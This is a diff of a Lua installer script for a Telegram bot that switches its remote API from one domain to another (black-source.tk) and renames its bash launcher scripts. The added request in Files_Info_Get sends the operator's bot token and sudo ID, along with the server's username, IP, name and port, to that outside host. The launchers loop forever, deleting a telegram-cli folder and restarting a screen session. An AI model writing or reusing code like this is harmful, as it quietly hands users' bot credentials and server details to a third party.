@@ -58,7 +58,7 @@ if not redis:get(Server_Done.."UserSudo_Write") then
 print("\27[1;34mSend Your Id Sudo :\27[m")
 local Id = io.read():gsub(' ','') 
 if tostring(Id):match('%d+') then
-data,res = https.request("https://boyka-api.ml/index.php?bn=info&id="..Id)
+data,res = https.request("https://black-source.tk/BlackTeAM/index.php?bn=info&id="..Id)
 if res == 200 then
 muaed = json:decode(data)
 if muaed.Info.info == 'Is_Spam' then
@@ -77,8 +77,9 @@ end ---ifnot
 end
 local function Files_Info_Get()
 Create_Info(redis:get(Server_Done.."Token_Write"),redis:get(Server_Done.."UserSudo_Write"))   
-local t = json:decode(https.request('https://boyka-api.ml/index.php?n=by&id='..redis:get(Server_Done.."UserSudo_Write").."&token="..redis:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
-local RunBot = io.open("Run", 'w')
+local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=BK&id='..redis:get(Server_Done.."UserSudo_Write").."&token="..redis:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
+print("::BOYKA::")
+local RunBot = io.open("BoykA", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
 cd $HOME/BoykA
@@ -91,14 +92,14 @@ rm -fr ../.telegram-cli
 done
 ]])
 RunBot:close()
-local RunTs = io.open("BA", 'w')
+local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
 cd $HOME/BoykA
 while(true) do
 rm -fr ../.telegram-cli
 screen -S BoykA -X kill
-screen -S BoykA ./Run
+screen -S BoykA ./BoykA
 done
 ]])
 RunTs:close()
